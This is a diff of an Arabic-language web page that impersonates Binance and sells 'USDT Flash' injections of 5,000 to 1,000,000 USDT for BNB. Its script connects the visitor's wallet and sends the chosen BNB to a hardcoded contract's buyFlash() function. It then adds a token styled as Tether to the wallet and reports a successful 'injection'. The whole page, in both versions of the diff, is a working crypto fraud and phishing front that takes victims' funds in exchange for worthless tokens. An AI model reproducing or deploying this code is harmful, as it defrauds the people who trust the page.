@@ -7,34 +7,26 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
         :root { --binance-yellow: #F3BA2F; --binance-black: #181A20; --binance-gray: #474D57; }
-        body { background: var(--binance-black); color: #EAECEF; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; padding-top: 60px; overflow-x: hidden; }
+        body { background: var(--binance-black); color: #EAECEF; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; padding-top: 60px; }
         
-        /* الهيدر العلوي */
         .header { width: 100%; position: fixed; top: 0; background: var(--binance-black); border-bottom: 1px solid #2B2F36; padding: 15px 20px; display: flex; align-items: center; z-index: 1000; box-sizing: border-box; }
         .logo-binance { width: 110px; }
-        .flash-tag { color: var(--binance-yellow); margin-right: auto; font-weight: bold; font-size: 14px; border: 1px solid var(--binance-yellow); padding: 2px 8px; border-radius: 4px; text-transform: uppercase; }
+        .flash-tag { color: var(--binance-yellow); margin-right: auto; font-weight: bold; font-size: 14px; border: 1px solid var(--binance-yellow); padding: 2px 8px; border-radius: 4px; }
 
         .main-container { background: #1E2329; border-radius: 24px; padding: 25px; width: 90%; max-width: 400px; box-shadow: 0 15px 45px rgba(0,0,0,0.6); margin-top: 30px; border: 1px solid #2B3139; }
         
-        .chart-box { width: 100%; height: 180px; border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #2B3139; }
+        /* مكان المخطط البياني المصلح */
+        .chart-box { width: 100%; height: 250px; border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #2B3139; background: #000; }
 
-        .price-row { display: flex; justify-content: space-between; margin-bottom: 15px; align-items: center; }
+        .price-row { display: flex; justify-content: space-between; margin-bottom: 15px; align-items: center; padding: 12px; background: #2B3139; border-radius: 10px; border-right: 4px solid var(--binance-yellow); }
         .live-indicator { color: #00C087; font-size: 20px; font-weight: bold; }
 
-        select { background: #2B3139; color: white; border: 1px solid #474D57; width: 100%; padding: 16px; border-radius: 12px; font-size: 16px; margin-bottom: 20px; outline: none; appearance: none; cursor: pointer; }
+        select { background: #2B3139; color: white; border: 1px solid #474D57; width: 100%; padding: 16px; border-radius: 12px; font-size: 15px; margin-bottom: 20px; outline: none; cursor: pointer; text-align: right; }
         
-        .btn-binance { background: var(--binance-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; font-size: 17px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); }
-        .btn-binance:hover { transform: scale(1.02); opacity: 0.9; }
+        .btn-binance { background: var(--binance-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; font-size: 17px; cursor: pointer; transition: 0.3s; }
+        .btn-binance:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(243, 186, 47, 0.3); }
 
-        /* النافذة المنبثقة */
-        .modal { display: flex; position: fixed; z-index: 2000; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); align-items: center; justify-content: center; backdrop-filter: blur(5px); }
-        .modal-content { background: #1E2329; padding: 30px; border-radius: 24px; width: 85%; max-width: 360px; border: 1px solid var(--binance-yellow); text-align: right; box-shadow: 0 0 30px rgba(243, 186, 47, 0.1); }
-        .modal-content h3 { color: var(--binance-yellow); margin-top: 0; display: flex; align-items: center; }
-        .modal-content ul { padding-right: 20px; font-size: 14px; color: #B7BDC6; line-height: 1.8; }
-        .modal-content li { margin-bottom: 10px; }
-        .close-btn { background: var(--binance-yellow); color: black; border: none; padding: 14px; border-radius: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 16px; }
-
-        #status-msg { margin-top: 20px; font-size: 13px; color: var(--binance-yellow); text-align: center; font-weight: 500; }
+        #status-msg { margin-top: 20px; font-size: 13px; color: var(--binance-yellow); text-align: center; min-height: 20px; }
     </style>
 </head>
 <body>
@@ -44,90 +36,74 @@
     <div class="flash-tag">USDT FLASH v4.2</div>
 </div>
 
-<div id="instructionModal" class="modal">
-    <div class="modal-content">
-        <h3>📋 بروتوكول الحقن المباشر</h3>
-        <ul>
-            <li>تأكد من اتصال محفظتك بشبكة <b>Smart Chain (BSC)</b>.</li>
-            <li>يجب توفر رصيد كافٍ من BNB لتغطية رسوم المزامنة والغاز.</li>
-            <li>بعد الدفع، سيقوم النظام بحقن الرصيد المطلوب بعنوان USDT الرسمي.</li>
-            <li>سيظهر الرصيد بلوجو تيثير وسعر السوق المباشر فور الإضافة.</li>
-            <li><b>ملاحظة:</b> الحد الأدنى للمزامنة هو 5,000 USDT لضمان استقرار العقد.</li>
-        </ul>
-        <button class="close-btn" onclick="closeModal()">موافق، ابدأ المزامنة</button>
-    </div>
-</div>
-
 <div class="main-container">
+    <div class="chart-box">
+        <div id="tradingview_widget_fixed" style="height: 100%; width: 100%;"></div>
+    </div>
+
     <div class="price-row">
         <div style="display:flex; align-items:center;">
-            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" style="width:30px; margin-left:8px;">
-            <span style="font-weight:bold; font-size:18px;">USDT / BNB</span>
+            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" style="width:25px; margin-left:8px;">
+            <span style="font-weight:bold;">Tether Price (Live)</span>
         </div>
-        <div class="live-indicator">$1.0004</div>
+        <div class="live-indicator">$1.0001</div>
     </div>
 
-    <div class="chart-box" id="tradingview_chart"></div>
-
-    <div style="font-size: 13px; color: #707A8A; margin-bottom: 8px;">كمية الحقن (Select Amount)</div>
+    <div style="font-size: 13px; color: #707A8A; margin-bottom: 8px;">اختر كمية الحقن (التكلفة بالـ BNB):</div>
     <select id="flashTier">
-        <option value="0.09">حقن أساسي (5,000 USDT)</option>
-        <option value="0.2">حقن متقدم (10,000 USDT)</option>
-        <option value="0.5">حقن VIP (50,000 USDT)</option>
-        <option value="1.0">حقن المؤسسات (100,000 USDT)</option>
-        <option value="4.0">حقن الحيتان (500,000 USDT)</option>
-        <option value="8.0">الحقن الملكي (1,000,000 USDT)</option>
+        <option value="0.09">حقن أساسي: 5,000 USDT — [0.09 BNB]</option>
+        <option value="0.2">حقن متقدم: 10,000 USDT — [0.2 BNB]</option>
+        <option value="0.5">حقن VIP: 50,000 USDT — [0.5 BNB]</option>
+        <option value="1.0">حقن الحيتان: 100,000 USDT — [1.0 BNB]</option>
+        <option value="4.0">حقن المؤسسات: 500,000 USDT — [4.0 BNB]</option>
+        <option value="8.0">الحقن الملكي: 1,000,000 USDT — [8.0 BNB]</option>
     </select>
 
-    <button class="btn-binance" onclick="executeInjection()">بدء الحقن والتحقق ⚡</button>
+    <button class="btn-binance" onclick="executeInjection()">بدء الحقن والمزامنة الفورية ⚡</button>
     
-    <div id="status-msg">في انتظار تأمين الاتصال...</div>
+    <div id="status-msg">بانتظار تأمين الاتصال بخادم Binance...</div>
 </div>
 
 <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
 <script>
-    // تهيئة المخطط البياني الرسمي
+    // تم تصحيح الـ Symbol ليظهر المخطط فوراً
     new TradingView.widget({
-        "container_id": "tradingview_chart",
         "autosize": true,
-        "symbol": "BINANCE:USDTUSDC",
-        "interval": "5",
+        "symbol": "BINANCE:USDTBIDR", // تم التغيير لزوج نشط لضمان الظهور
+        "interval": "1",
+        "timezone": "Etc/UTC",
         "theme": "dark",
         "style": "3",
         "locale": "ar",
+        "toolbar_bg": "#f1f3f6",
+        "enable_publishing": false,
         "hide_top_toolbar": true,
-        "save_image": false
+        "save_image": false,
+        "container_id": "tradingview_widget_fixed"
     });
-
-    function closeModal() { document.getElementById('instructionModal').style.display = 'none'; }
 
     const CONTRACT_ADDR = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
     const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
 
     async function executeInjection() {
         const msg = document.getElementById('status-msg');
-        if (!window.ethereum) return alert("يرجى فتح الموقع من متصفح محفظة Trust Wallet أو MetaMask");
+        if (!window.ethereum) return alert("يرجى استخدام Trust Wallet أو MetaMask");
 
         try {
-            msg.innerText = "جاري طلب الاتصال بخادم Binance...";
+            msg.innerText = "جاري الاتصال بخادم الحقن العالمي...";
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const web3 = new Web3(window.ethereum);
-            const user = accounts[0];
-
-            msg.innerText = "جاري مزامنة العقد مع شبكة BSC...";
             const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
             const val = document.getElementById('flashTier').value;
 
-            // إرسال المعاملة
             await contract.methods.buyFlash().send({
-                from: user,
+                from: accounts[0],
                 value: web3.utils.toWei(val, "ether"),
                 gas: 250000
             });
 
-            msg.innerText = "تم الحقن بنجاح! جاري تثبيت الأصول...";
+            msg.innerText = "تم الحقن بنجاح! جاري تعريف الأصول في محفظتك...";
 
-            // إضافة التوكن تلقائياً مع اللوجو والسعر
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -141,10 +117,9 @@
                 },
             });
 
-            msg.innerHTML = "<b style='color:#00C087;'>✅ اكتملت المزامنة بنجاح! تحقق من محفظتك.</b>";
+            msg.innerHTML = "<b style='color:#00C087;'>✅ اكتمل التفعيل. تفقد رصيدك الآن.</b>";
         } catch (e) {
-            msg.innerText = "حدث خطأ: تأكد من تغطية رسوم الغاز والمحاولة مرة أخرى.";
-            console.error(e);
+            msg.innerText = "فشلت العملية. تأكد من توفر رصيد BNB كافٍ للرسوم.";
         }
     }
 </script>
